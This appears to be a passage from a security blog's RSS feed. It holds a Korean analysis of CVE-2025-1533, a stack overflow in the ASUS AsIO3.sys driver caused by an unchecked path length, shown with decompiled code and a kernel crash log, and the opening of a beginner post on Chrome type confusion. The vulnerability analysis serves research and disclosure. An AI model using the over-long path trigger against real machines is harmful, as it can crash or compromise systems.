class="hljs-keyword">if</span> ( status &gt;= <span class="hljs-number">0</span> )  {    LinkTarget.Buffer = (PWSTR)<span class="hljs-constructor">ExAllocatePoolWithTag(PagedPool, 0xFFuLL, 0x705052u)</span>;        status = <span class="hljs-constructor">ZwQuerySymbolicLinkObject(LinkHandle, &amp;LinkTarget, &amp;ReturnedLength)</span>;    <span class="hljs-constructor">ZwClose(LinkHandle)</span>;    memset(ntImagePath, <span class="hljs-number">0</span>, sizeof(ntImagePath));     <span class="hljs-comment">// [3]</span>memcpy(ntImagePath, LinkTarget.Buffer , LinkTarget.Length) <span class="hljs-comment">// where LinkTarget.Buffer e.g  == \Device\HarddiskVolume3</span>    ptrWin32ImagePath = &amp;win32ImagePath-&gt;Buffer<span class="hljs-literal">[<span class="hljs-identifier">backslashPos</span>]</span>; <span class="hljs-comment">// set pointer to the application path without partition letter. e.g: AAAAAAAAA......\AAAAAAAAAAA....\TestApp.exe</span>    ptrNtImagePath = ntImagePath;    <span class="hljs-keyword">do</span>      ++ptrNtImagePath;    <span class="hljs-keyword">while</span> ( *ptrNtImagePath ); <span class="hljs-comment">//set pointer at the end of current string </span>    idx = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">do</span>    {      wcharToCopy = ptrWin32ImagePath<span class="hljs-literal">[<span class="hljs-identifier">idx</span>]</span>;      ptrNtImagePath<span class="hljs-literal">[<span class="hljs-identifier">idx</span><span class="hljs-operator">++</span>]</span> = wcharToCopy;    }    <span class="hljs-keyword">while</span> ( wcharToCopy );    <span class="hljs-constructor">RtlInitUnicodeString(&amp;<span class="hljs-params">tmpString</span>, (PCWSTR)</span>ntImagePath);    <span class="hljs-constructor">RtlCopyUnicodeString(<span class="hljs-params">outNtImagePath</span>, &amp;<span class="hljs-params">tmpString</span>)</span>;    <span class="hljs-constructor">RtlFreeUnicodeString(&amp;LinkTarget)</span>;  }  return (unsigned <span class="hljs-built_in">int</span>)status;}</code></pre><p><code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xB294; win32 Path(C:\TestApp.exe)&#xB97C; NT Namespace Path(\Device\HarddiskVolume3\TestApp.exe)&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>[2]&#xC5D0;&#xC11C; <code>win32ImagePath</code> &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xB97C; &#xBD84;&#xB9AC;&#xD558;&#xACE0;, <code>ZwOpenSymbolicLinkObject</code>&#xC640; <code>ZwQuerySymbolicLinkObject</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; NT Namespace Path&#xB97C; &#xC5BB;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C; NT Namespace Path&#xB97C; ntImagePath&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; do-while&#xBB38;&#xC744; &#xD1B5;&#xD574; win32ImagePath&#xC5D0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xB098;&#xBA38;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; ntImagePath&#xC5D0; &#xC774;&#xC5B4; &#xBD99;&#xC5EC; win32 Path&#xB97C; NT Namespace Path&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; ntImagePath &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xB97C; 255&#xB85C; &#xC124;&#xC815;&#xD55C; &#xC774;&#xC720;&#xB294; Windows&#xC758; &#xCD5C;&#xB300; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xAC00; 255&#xC774;&#xBBC0;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC9C0;&#xB9CC;, &#xACBD;&#xB85C; &#xC55E;&#xC5D0; <code>\\?\</code>&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xACBD;&#xC6B0; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xAC00; 32,767&#xAE4C;&#xC9C0; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry">https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry</a></li></ul><pre><code class="hljs dns">Stack before get overwrittenfffff8<span class="hljs-number">07`66943926</span> <span class="hljs-number">4533</span>c0          xor     r8d,r8d<span class="hljs-number">18</span>: kd&gt; kb # RetAddr               : Args to Child                                                           : Call Site<span class="hljs-number">00</span> fffff8<span class="hljs-number">07`66943021</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff9888`b4ab586c <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : AsIO<span class="hljs-number">3+0x3926</span><span class="hljs-number">01</span> fffff8<span class="hljs-number">07`66942596</span>     : ffff9888`c152ad<span class="hljs-number">00 00000000</span>`c<span class="hljs-number">0000002</span> ffff9888`c152ae<span class="hljs-number">50 00000000</span>`<span class="hljs-number">00000001</span> : AsIO<span class="hljs-number">3+0x3021</span><span class="hljs-number">02</span> fffff807`<span class="hljs-number">622650d5</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff8<span class="hljs-number">07`62261993</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff9888`e3ab7e98 : AsIO<span class="hljs-number">3+0x2596</span><span class="hljs-number">03</span> fffff807`<span class="hljs-number">626</span>becb3     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff938a`<span class="hljs-number">6</span>fccf0d0 ffff9888`e3ab7e98 ffff9888`c152ad00 : nt!IofCallDriver+<span class="hljs-number">0</span>x55<span class="hljs-number">04</span> fffff807`<span class="hljs-number">626</span>cac24     : fffff807`<span class="hljs-number">626</span>bd700 fffff807`<span class="hljs-number">626</span>bd700 ffff9888`b4941a00 ffff938a`<span class="hljs-number">6</span>fccf1f0 : nt!IopParseDevice+<span class="hljs-number">0</span>x15b3<span class="hljs-number">05</span> fffff807`<span class="hljs-number">626c95d2</span>     : ffff9888`e30d9a01 ffff938a`<span class="hljs-number">6</span>fccf1f<span class="hljs-number">0 00000000</span>`<span class="hljs-number">00000040</span> ffff9888`b4ab5820 : nt!ObpLookupObjectName+<span class="hljs-number">0</span>x1104<span class="hljs-number">06</span> fffff807`<span class="hljs-number">626</span>ace47     : ffff9<span class="hljs-number">249`00000000</span> ffff9888`dbf27a<span class="hljs-number">20 00000098</span>`c<span class="hljs-number">0f6f980</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : nt!ObOpenObjectByNameEx+<span class="hljs-number">0</span>x1f2<span class="hljs-number">07</span> fffff807`<span class="hljs-number">626</span>ac319     : <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f920</span> <span class="hljs-number">00000000</span>`c<span class="hljs-number">0100080</span> <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f980</span> <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f928</span> : nt!IopCreateFile+<span class="hljs-number">0</span>xb17<span class="hljs-number">08</span> fffff807`<span class="hljs-number">6242a508</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!NtCreateFile+<span class="hljs-number">0</span>x79<span class="hljs-number">09</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">68</span>ff0e44     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6671a650</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000360</span> : nt!KiSystemServiceCopyEnd+<span class="hljs-number">0</span>x28<span class="hljs-number">0</span>a <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6671a650</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000360</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : ntdll!NtCreateFile+<span class="hljs-number">0</span>x14<span class="hljs-number">0</span>b <span class="hljs-number">00007</span>ffd`<span class="hljs-number">66719</span>fbc     : <span class="hljs-number">00007</span>ff6`af8311ae b<span class="hljs-number">2200007</span>`ff69d4f0 a<span class="hljs-number">8c00000</span>`<span class="hljs-number">00032</span>cc<span class="hljs-number">1 00000000</span>`<span class="hljs-number">00000000</span> : KERNELBASE!CreateFileInternal+<span class="hljs-number">0</span>x590<span class="hljs-number">0</span>c <span class="hljs-number">00007</span>ff6`af835925     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : KERNELBASE!CreateFileW+<span class="hljs-number">0</span>x7c<span class="hljs-number">0d</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00000003</span> : <span class="hljs-number">0</span>x00007ff6`af835925Bug triggeredFor analysis of this file, run !analyze -vnt!DbgBreakPointWithStatus:fffff807`<span class="hljs-number">6241f2f0</span> cc              int     <span class="hljs-number">3</span><span class="hljs-number">18</span>: kd&gt; !analyze -vConnected to Windows <span class="hljs-number">10 22621</span> x64 target at (Thu Jan <span class="hljs-number">23 21:09:08</span>.<span class="hljs-number">278 2025</span> (UTC + <span class="hljs-number">1</span>:<span class="hljs-number">00</span>)), ptr64 TRUELoading Kernel Symbols............................................................................................................................................................................................................................................Loading User Symbols.........Loading unloaded module list...........************* Symbol Loading Error Summary **************Module name            ErrorSharedUserData         No error - symbol load deferredYou can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded.You should also verify that your symbol search path (.sympath) is correct.********************************************************************************                                                                             **                        Bugcheck Analysis                                    **                                                                             ********************************************************************************DRIVER_OVERRAN_STACK_BUFFER (f7)<span class="hljs-keyword">A</span> driver has overrun a stack-based buffer.  This overrun could potentiallyallow a malicious user to gain control of this machine.DESCRIPTION<span class="hljs-keyword">A</span> driver overran a stack-based buffer (or local variable) in a way that wouldhave overwritten the function&apos;s return address and jumped back to an arbitraryaddress when the function returned.  This is the classic &quot;buffer overrun&quot;hacking attack and the system has been brought down to prevent a malicious userfrom gaining complete control of it.Do a kb to get a stack backtrace -- the last routine on the stack before thebuffer overrun handlers and BugCheck call is the one that overran its localvariable(s).Arguments:Arg1: ffbe93cb6f8de881, Actual security check cookie from the stackArg2: <span class="hljs-number">00000581</span>a36bfe71, Expected security check cookieArg3: fffffa7e5c94018e, Complement of the expected security check cookieArg4: <span class="hljs-number">0000000000000000</span>, zeroDebugging Details:------------------Unable to load image \??\C:\Windows\system32\drivers\AsIO3.sys, Win32 error <span class="hljs-number">0</span>n2KEY_VALUES_STRING: <span class="hljs-number">1</span>[...]magic_cookie value check:<span class="hljs-number">18</span>: kd&gt; dq ffff938a`<span class="hljs-number">6</span>fcceb90 L1ffff938a`<span class="hljs-number">6</span>fcceb90  <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>Last <span class="hljs-number">20</span> frames<span class="hljs-number">18</span>: kd&gt; kb <span class="hljs-number">20</span> # RetAddr               : Args to Child                                                           : Call Site<span class="hljs-number">00</span> fffff8<span class="hljs-number">07`62566c12</span>     : ffff938a`<span class="hljs-number">6</span>fcccf40 fffff807`<span class="hljs-number">622a9f60</span> ffff8<span class="hljs-number">181`38f51180</span> ffbe93cb`<span class="hljs-number">6</span>f8de801 : nt!DbgBreakPointWithStatus<span class="hljs-number">01</span> fffff807`<span class="hljs-number">625662d3</span>     : ffff8<span class="hljs-number">181`00000003</span> ffff938a`<span class="hljs-number">6</span>fcccf40 fffff807`<span class="hljs-number">6242</span>ef<span class="hljs-number">20 00000000</span>`<span class="hljs-number">000000f7</span> : nt!KiBugCheckDebugBreak+<span class="hljs-number">0</span>x12<span class="hljs-number">02</span> fffff8<span class="hljs-number">07`62415017</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">000000</span>ee fffff807`<span class="hljs-number">623</span>c26fb ffff938a`<span class="hljs-number">6</span>fcce6<span class="hljs-number">48 00000000</span>`<span class="hljs-number">00000001</span> : nt!KeBugCheck2+<span class="hljs-number">0</span>xba3<span class="hljs-number">03</span> fffff8<span class="hljs-number">07`66946f97</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">000000f7</span> ffbe93cb`<span class="hljs-number">6</span>f8de8<span class="hljs-number">81 00000581</span>`a36bfe71 fffffa7e`<span class="hljs-number">5</span>c94018e : nt!KeBugCheckEx+<span class="hljs-number">0</span>x107<span class="hljs-number">04</span> fffff8<span class="hljs-number">07`66947032</span>     : ffff938a`<span class="hljs-number">6</span>fccd6d8 ffff938a`<span class="hljs-number">6</span>fccdce<span class="hljs-number">0 00000000</span>`<span class="hljs-number">6</span>fccde60 ffff938a`<span class="hljs-number">6</span>fccdc68 : AsIO<span class="hljs-number">3+0x6f97</span><span class="hljs-number">05</span> fffff807`<span class="hljs-number">66946</span>fcb     : fffff8<span class="hljs-number">07`00000000</span> fffff8<span class="hljs-number">07`6222e158</span> fffff807`<span class="hljs-number">66946</span>fb<span class="hljs-number">8 00000000</span>`<span class="hljs-number">00000000</span> : AsIO<span class="hljs-number">3+0x7032</span><span class="hljs-number">06</span> fffff8<span class="hljs-number">07`624205b2</span>     : ffff938a`<span class="hljs-number">6</span>fccde60 ffff938a`<span class="hljs-number">6</span>fccd720 fffff8<span class="hljs-number">07`66940000</span> fffff8<span class="hljs-number">07`66943958</span> : AsIO3+<span class="hljs-number">0</span>x6fcb<span class="hljs-number">07</span> fffff807`<span class="hljs-number">6222</span>cc93     : ffff938a`<span class="hljs-number">6</span>fcce890 ffff938a`<span class="hljs-number">6</span>fcce648 fffff8<span class="hljs-number">07`66943958</span> fffff807`<span class="hljs-number">6694a0b4</span> : nt!RtlpExecuteHandlerForException+<span class="hljs-number">0</span>x12<span class="hljs-number">08</span> fffff807`<span class="hljs-number">6231817</span>e     : ffffffff`ffffffff ffff938a`<span class="hljs-number">6</span>fcce6f0 ffff938a`<span class="hljs-number">6</span>fcce6f0 ffff938a`<span class="hljs-number">6</span>fccde60 : nt!RtlDispatchException+<span class="hljs-number">0</span>x2f3<span class="hljs-number">09</span> fffff807`<span class="hljs-number">6242</span>af7c     : ffffd203`b9792f70 ffff938a`<span class="hljs-number">6</span>fccec<span class="hljs-number">08 00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000004</span> : nt!KiDispatchException+<span class="hljs-number">0</span>x1ae<span class="hljs-number">0</span>a fffff807`<span class="hljs-number">62425d</span>d8     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00</span>ff0000 ffffd203`ee528<span class="hljs-number">180 00000000</span>`<span class="hljs-number">000000d0</span> ffffd203`b96b44d0 : nt!KiExceptionDispatch+<span class="hljs-number">0</span>x13c<span class="hljs-number">0</span>b fffff807`<span class="hljs-number">6242</span>bc67     : fffff8<span class="hljs-number">07`62261993</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> fffff8<span class="hljs-number">07`66943929</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> : nt!KiGeneralProtectionFault+<span class="hljs-number">0</span>x358<span class="hljs-number">0</span>c fffff8<span class="hljs-number">07`62261993</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> fffff8<span class="hljs-number">07`66943929</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00040244</span> : nt!memcpy+<span class="hljs-number">0</span>xa7<span class="hljs-number">0d</span> fffff8<span class="hljs-number">07`66943958</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffffd203`cca310<span class="hljs-number">10 00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!RtlCopyUnicodeString+<span class="hljs-number">0</span>x43<span class="hljs-number">0</span>e <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : AsIO<span class="hljs-number">3+0x3958</span><span class="hljs-number">0</span>f <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">10 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">11 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">12 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">13 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">14 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">15 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">16 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">17 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">18 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">19 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>a <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>b <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>c <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1d</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>e <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>f <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span></code></pre><p>&#xB530;&#xB77C;&#xC11C;, <code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; ntImagePath &#xBC30;&#xC5F4;&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>\\?\</code> &#xD3EC;&#xD568;&#xD55C; 255 &#xBCF4;&#xB2E4; &#xAE34; &#xACBD;&#xB85C;&#xB97C; &#xAC00;&#xC9C4; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; Stack Overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1533">https://nvd.nist.gov/vuln/detail/CVE-2025-1533</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry">https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/ASUS/">ASUS</category>
      
      <category domain="https://hackyboiz.github.io/tags/AsIO3-sys/">AsIO3.sys</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 1.(EN)</title>
      <link>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/</link>
      <guid>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/</guid>
      <pubDate>Tue, 01 Jul 2025 08:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hello, I&amp;#x2019;m OUYA77.&lt;/p&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hello, I&#x2019;m OUYA77.</p><p>You might be surprised to suddenly see Chrome appear out of nowhere. Honestly, I was just as surprised myself.</p><p>I never expected to dive into Chrome, but I happened to watch a conference video by chance, and thought, &#x201C;Wow, this is actually fun.&#x201D; So without much thought, I started studying it. (<a href="https://www.youtube.com/watch?v=RL2po1swXO4">Link</a>)</p><p><img src="image.png" alt="image.png"></p><p>I don&#x2019;t have any grand ambitions like hunting for zero-days or making money through bug bounty programs. It&#x2019;s really just that&#x2014;I found it interesting and wanted to learn more. While digging into Chrome vulnerability research, I kept encountering the term <strong>Type Confusion</strong>. Naturally, I got curious: what exactly <em>is</em> Type Confusion?</p><p>I browsed through various blog posts online, but since I had zero background in JavaScript or web stuff, most of it went way over my head. Still, I pushed through and eventually realized, &#x201C;Ah, <em>this</em> is how Type Confusion happens&#x2014;and <em>this</em> is how it&#x2019;s exploited.&#x201D;</p><p>I started thinking about how I could make my learning process more productive and meaningful. Then I thought of this: If I could explain Type Confusion&#x2014;a foundational concept in Chrome exploitation&#x2014;in a way that&#x2019;s approachable for beginners like myself, wouldn&#x2019;t that be a meaningful contribution already?</p><p>So&#x2026; here it is!!!!</p><p><img src="TypeConfusion101.png" alt="TypeConfusion101.png"></p><p>Let&#x2019;s take a look at what Type Confusion actually is, why it occurs in Chrome, and what we can do with it! </p><p>To be honest, I&#x2019;ve already dropped a few spoilers about Type Confusion here and there&#x2014;couldn&#x2019;t help myself. &#x1F605; In fact, I even wrote a short piece introducing Type Confusion in our hacking team&#x2019;s newsletter:</p><p><a href="https://maily.so/hackyboiz/posts/1gz2v4jxr3q">https://maily.so/hackyboiz/posts/1gz2v4jxr3q</a></p><p>&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;^^</p><p>I&#x2019;m planning for this &#x201C;Type Confusion 101 in Chrome&#x201D; series to be a four-part journey&#x2014;but hey, life never goes as planned, and that&#x2019;s what makes it fun, right? Let&#x2019;s see how far we get together! &#x1F604;</p><p>Today, we&#x2019;re starting with the basics.</p><p>You probably already know what Chrome is, but let&#x2019;s briefly go over it&#x2014;along with V8, the component where Type Confusion typically happens.</p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-Overview-of-Chrome&#x2019;s-Architecture"><a href="#1-Overview-of-Chrome&#x2019;s-Architecture" class="headerlink" title="1. Overview of Chrome&#x2019;s Architecture"></a>1. 